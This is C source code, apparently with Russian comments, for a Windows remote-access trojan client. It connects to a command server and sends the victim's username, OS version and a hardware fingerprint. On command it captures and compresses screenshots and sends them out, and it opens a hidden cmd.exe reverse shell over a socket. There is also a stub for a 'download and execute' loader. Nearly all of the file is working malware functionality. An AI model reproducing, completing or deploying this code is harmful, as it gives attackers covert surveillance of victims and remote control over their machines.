#include "winsock2.h"
#include "intrin.h"
#include "ntdll.h"
#include "iphlpapi.h"
#include "stdio.h"

#pragma comment(lib, "iphlpapi")
#pragma comment(lib, "ws2_32")
#pragma warning(disable : 4996)

#ifndef min
#define min(a,b) (((a) < (b)) ? (a) : (b))
#endif

#define ADDRSERVER "127.000.000.001"

SOCKET Socket;

#define CMD_HADSHAKE	0x0
#define CMD_ONLINE		0x1
#define CMD_OTVET_OK	0x2
#define CMD_OTVET_ER	0x3
#define CMD_SCREEN		0x4
#define CMD_LOADER		0x5
#define CMD_SHELL		0x6

void SaveBitmap(char* szFilename, HBITMAP hBitmap);

int x1, y1, x2, y2, w, h;

typedef struct CLIENTS
{
	char USERNAME[100];
	char OSVER[100];
	char HWID[100];
} CLIENTS;

typedef struct DLE
{
	char URL[1020];
} DLE;

typedef struct BIGSCREEN
{
	int w;
	int h;
	DWORD ZipSize;
	DWORD Size;
} BIGSCREEN;

typedef struct CMDiDATA
{
	DWORD CMD;
	BYTE DATA[1020];
} CMDiDATA;

char* GetHwid()
{
	int CPUInfo[4];
	PIP_ADAPTER_INFO pAdapterInfo;
	IP_ADAPTER_INFO AdapterInfo[16];
	DWORD dwBufLen;
	wchar_t mac[8] = { 0x1, 0x2, 0x1, 0x2, 0x1, 0x2, 0x1, 0x2 };
	__cpuid(CPUInfo, 0);
	dwBufLen = sizeof(AdapterInfo);
	GetAdaptersInfo(AdapterInfo, &dwBufLen);
	pAdapterInfo = AdapterInfo;
	do
	{
		int i;
		for (i = 0; i < 8; i++)
		{
			mac[i] = mac[i] + pAdapterInfo->Address[i];
		}
		pAdapterInfo = pAdapterInfo->Next;
	} while (pAdapterInfo);
	char hwid[100];
	memset(hwid, 0, sizeof(hwid));
	wsprintfA(hwid, "%x%x%x%x%x%x%x%x%x%x%x%x",
		CPUInfo[0], CPUInfo[1], CPUInfo[2],
		CPUInfo[3], mac[0], mac[1],
		mac[2], mac[3], mac[4],
		mac[5], mac[6], mac[7]);
	return hwid;
}

char* GetUsername()
{
	char username[100];
	DWORD size = UNLEN;
	memset(username, 0, sizeof(username));
	GetUserNameA(username, &size);
	return username;
}

char* GetOS()
{
	char os[100];
	PPEBME pPeb = (PPEBME)__readfsdword(0x30);
	memset(os, 0, sizeof(os));
	wsprintfA(os, "%d.%d.%d", pPeb->NtMajorVersion, pPeb->NtMinorVersion, pPeb->NtBuildNumber);
	return os;
}

BYTE *Decompress(BYTE *compBuffer, \
	const int compBufferLen, \
	const int uncompBufferLen, \
	DWORD *uncompBufferSize)
{
	BYTE *uncompBuffer = (BYTE*)malloc(uncompBufferLen);
	memset(uncompBuffer, 0, uncompBufferLen);

	NTSTATUS result = pRtlDecompressBuffer(
		COMPRESSION_FORMAT_LZNT1,
		uncompBuffer,
		uncompBufferLen,
		compBuffer,
		compBufferLen,
		uncompBufferSize
	);
	if (result != STATUS_SUCCESS)
	{
		return 0;
	}
	return uncompBuffer;
}

BYTE *Compress(BYTE *uncompBuffer, \
	const DWORD uncompBufferLen, \
	DWORD compBufferLen, \
	DWORD *compBufferSize)
{
	DWORD bufWorkspaceSize;
	DWORD fragWorkspaceSize;
	NTSTATUS ret = pRtlGetCompressionWorkSpaceSize(
		COMPRESSION_FORMAT_LZNT1,
		&bufWorkspaceSize,
		&fragWorkspaceSize
	);

	if (ret != STATUS_SUCCESS) {
		return 0;
	}
	VOID *workspace = (VOID *)LocalAlloc(LMEM_FIXED, bufWorkspaceSize);
	
	if (workspace == NULL) {
		return 0;
	}

	BYTE *compBuffer = (BYTE*)malloc(compBufferLen);
	memset(compBuffer, 0, sizeof(compBufferLen));

	NTSTATUS result = pRtlCompressBuffer(
		COMPRESSION_FORMAT_LZNT1,
		uncompBuffer,
		uncompBufferLen,
		compBuffer,
		compBufferLen,
		2048,
		compBufferSize,
		workspace
	);
	LocalFree(workspace);
	if (result != STATUS_SUCCESS) {
		return 0;
	}
	return compBuffer;
}

DWORD WINAPI GETSCREEN(LPVOID param)
{
	HDC hScreen = GetDC(NULL);
	HDC hDC = CreateCompatibleDC(hScreen);
	BYTE* buff;
	HBITMAP hBitmap = CreateCompatibleBitmap(hScreen, 683, 384);
	SelectObject(hDC, hBitmap);
	SetStretchBltMode(hDC, HALFTONE);
	StretchBlt(hDC, 0, 0, 683, 384, hScreen, 0, 0, w, h, SRCCOPY);
	SelectObject(hDC, hBitmap);
	BITMAPINFO bmi = { sizeof(BITMAPINFOHEADER), 683, 384, 1, 32, BI_RGB, 0, 0, 0, 0, 0 };
	GetDIBits(hDC, hBitmap, 0, 384, NULL, &bmi, DIB_RGB_COLORS);
	DWORD buffsize;
	buffsize = bmi.bmiHeader.biSizeImage;
	buff = (BYTE*)malloc(buffsize);
	GetDIBits(hDC, hBitmap, 0, 384, buff, &bmi, DIB_RGB_COLORS);
	DWORD realCompSize;
	BYTE *compressed_buffer = Compress(buff, buffsize, buffsize + 512, &realCompSize);
	CMDiDATA indata;
	memset(&indata, 0, sizeof(CMDiDATA));
	
	indata.CMD = CMD_SCREEN;
	BIGSCREEN screenshot;
	screenshot.w = 683;
	screenshot.h = 384;
	screenshot.ZipSize = realCompSize;
	screenshot.Size = buffsize;
	memcpy(&indata.DATA, &screenshot, sizeof(BIGSCREEN));
	send(Socket, (char*)&indata, sizeof(CMDiDATA), 0);
	send(Socket, (char *)compressed_buffer, screenshot.ZipSize, 0);
	
	free(buff);
	DeleteDC(hDC);
	DeleteDC(hScreen);
	DeleteObject(hBitmap);
	free(compressed_buffer);
	memset(&bmi, 0, sizeof(BITMAPINFO));
	memset(&indata, 0, sizeof(CMDiDATA));
	memset(&screenshot, 0, sizeof(BIGSCREEN));
	return 0;
}

DWORD WINAPI DLEFUNC(LPVOID url)
{
	//char *urlarrdfile = (char*)url;
	//CMDiDATA indata; //создаем структуру отвечающую за протокол
	//memset(&indata, 0, sizeof(CMDiDATA)); //почистим 
	//indata.CMD = CMD_OTVET_OK;
	//send(Socket, (char*)&indata, sizeof(CMDiDATA), 0);
	printf("\n download and execute");
	return 0;
}

DWORD WINAPI RUNSHELL(LPVOID port)
{
	SOCKADDR_IN sin;
	SOCKET shellsock;
	sin.sin_family = AF_INET;
	sin.sin_port = htons(8080);
	sin.sin_addr.S_un.S_addr = inet_addr(ADDRSERVER);
	shellsock = socket(AF_INET, SOCK_STREAM, 0);
	DWORD lpNumberOfBytesRead;
	SECURITY_ATTRIBUTES secu =
	{
		(DWORD)sizeof(SECURITY_ATTRIBUTES), NULL, TRUE
	};
	STARTUPINFOA sInfo;
	PROCESS_INFORMATION pInfo;
	HANDLE hPipeRead1, hPipeWrite1, hPipeRead2, hPipeWrite2;
	char szBuffer[4096], szCmdPath[MAX_PATH];
	int i, count = 0;
	CreatePipe(&hPipeRead1, &hPipeWrite1, &secu, 0);
	CreatePipe(&hPipeRead2, &hPipeWrite2, &secu, 0);
	GetEnvironmentVariableA("ComSpec", szCmdPath, sizeof(szCmdPath));

	memset(&sInfo, 0, sizeof(sInfo));
	memset(&pInfo, 0, sizeof(pInfo));
	sInfo.cb = sizeof(STARTUPINFOA);
	sInfo.dwFlags = STARTF_USESHOWWINDOW + STARTF_USESTDHANDLES;
	sInfo.wShowWindow = SW_HIDE;
	sInfo.hStdInput = hPipeRead2;
	sInfo.hStdOutput = hPipeWrite1;
	sInfo.hStdError = hPipeWrite1;
	CreateProcessA(NULL, szCmdPath, &secu, &secu, TRUE, 0, NULL, NULL, &sInfo, &pInfo);

	while (TRUE)
	{
		if (connect(shellsock, (SOCKADDR*)&sin, sizeof(sin)) == 0)
		{
			while (TRUE)
			{
				Sleep(100);
				memset(szBuffer, 0, sizeof(szBuffer));
				PeekNamedPipe(hPipeRead1, NULL, NULL, NULL, &lpNumberOfBytesRead, NULL);
				while (lpNumberOfBytesRead)
				{
					Sleep(200);
					if (!ReadFile(hPipeRead1, szBuffer, sizeof(szBuffer), &lpNumberOfBytesRead, NULL)) 
						break;
					else
					{
						send(shellsock, szBuffer, lpNumberOfBytesRead, 0);
					}
					PeekNamedPipe(hPipeRead1, NULL, NULL, NULL, &lpNumberOfBytesRead, NULL);
				}
				
				Sleep(200);

				i = recv(shellsock, szBuffer, sizeof(szBuffer), 0);

				if (shellsock == 0)
				{
					count++;
					if (count > 1) break;
				}

				if (!strstr(szBuffer, "exit") == 0)
				{
					closesocket(shellsock);
					goto exit;
				}

				else 
					WriteFile(hPipeWrite2, szBuffer, i, &lpNumberOfBytesRead, 0);
			}
		}
		else
		{
			Sleep(100);
		}
	}
exit:
	TerminateProcess(pInfo.hProcess, 0);
	return 0;
}

DWORD WINAPI RecvThread(LPVOID param)
{
	while (TRUE)
	{
		CMDiDATA indata; //создаем структуру отвечающую за протокол
		memset(&indata, 0, sizeof(CMDiDATA)); //почистим 							  //recv(Socket, (char*)&indata, sizeof(CMDiDATA), 0); //прием сообщения от cервера
		if (sizeof(CMDiDATA) == recv(Socket, (char*)&indata, sizeof(CMDiDATA), 0)) //прием сообщения от cервера
		{
			switch (indata.CMD)
			{
				case CMD_LOADER://если indata.cmd == CMD_LOADER
				{
					CreateThread(NULL, 0, DLEFUNC, NULL, 0, 0);
					break;
				}

				case CMD_SHELL:
				{
					CreateThread(NULL, 0, RUNSHELL, NULL, 0, 0);
					break;
				}

				case CMD_SCREEN:
				{
					CreateThread(NULL, 0, GETSCREEN, NULL, 0, 0);
					break;
				}
				default:
					break;
			}
		}
		else {
			if (10054 == GetLastError())
			{
				closesocket(Socket);
				return 0;
			}
			Sleep(1000);
		}
	}
	return 0;
}

int WINAPI WinMain(
	HINSTANCE hInstance,
	HINSTANCE hPrevInstance,
	LPSTR     lpCmdLine,
	int       nShowCmd
)
{
	//hIn = GetStdHandle(STD_INPUT_HANDLE);
	//hOut = GetStdHandle(STD_OUTPUT_HANDLE);

	x1 = GetSystemMetrics(SM_XVIRTUALSCREEN);
	y1 = GetSystemMetrics(SM_YVIRTUALSCREEN);
	x2 = GetSystemMetrics(SM_CXVIRTUALSCREEN);
	y2 = GetSystemMetrics(SM_CYVIRTUALSCREEN);
	w = x2 - x1;
	h = y2 - y1;

	HMODULE ntdll = LoadLibraryA("ntdll.dll");
	pRtlGetCompressionWorkSpaceSize = (fRtlGetCompressionWorkSpaceSize)\
		GetProcAddress(ntdll, "RtlGetCompressionWorkSpaceSize");
	pRtlCompressBuffer = (fRtlCompressBuffer)\
		GetProcAddress(ntdll, "RtlCompressBuffer");
	pRtlDecompressBuffer = (fRtlDecompressBuffer)\
		GetProcAddress(ntdll, "RtlDecompressBuffer");

	struct WSAData wsaData;
	SOCKADDR_IN ServerAddr;
	WORD DLLVersion = MAKEWORD(2, 2);
	WSAStartup(DLLVersion, &wsaData);

start:
	memset(&ServerAddr, 0, sizeof(ServerAddr));
	Socket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	ServerAddr.sin_family = AF_INET;
	//задаем конект на локалхост к восьмидесятому порту
	ServerAddr.sin_port = htons(80);
	ServerAddr.sin_addr.s_addr = inet_addr(ADDRSERVER);
	//подключаемся к серверу!!!

	if (connect(Socket, (SOCKADDR*)&ServerAddr, sizeof(ServerAddr)) == 0)
	{
		printf("connected!\n");
		//если мы подключились то передаем хендшейк:)
		CMDiDATA indata; //создаем структуру отвечающую за протокол
		CLIENTS client; //создаем структуру отвечающую за инфу о клиенте
		memset(&indata, 0, sizeof(CMDiDATA)); //почистим 
		memset(&client, 0, sizeof(CLIENTS)); //почистим
		memcpy(client.HWID, GetHwid(), sizeof(client.HWID));
		memcpy(client.USERNAME, GetUsername(), sizeof(client.USERNAME));
		memcpy(client.OSVER, GetOS(), sizeof(client.OSVER));
		indata.CMD = CMD_HADSHAKE;
		memcpy(indata.DATA, &client, sizeof(CLIENTS));
		send(Socket, (char*)&indata, sizeof(CMDiDATA), 0);
		HANDLE RECV = CreateThread(NULL, 0, RecvThread, NULL, 0, 0); //создаем тред который будет бесконечно принимать сообщения от сервера
		WaitForSingleObject(RECV, INFINITE); //Бесконечно ожидаем пока этот тред работает...
	}
	Sleep(10000);
	goto start;
}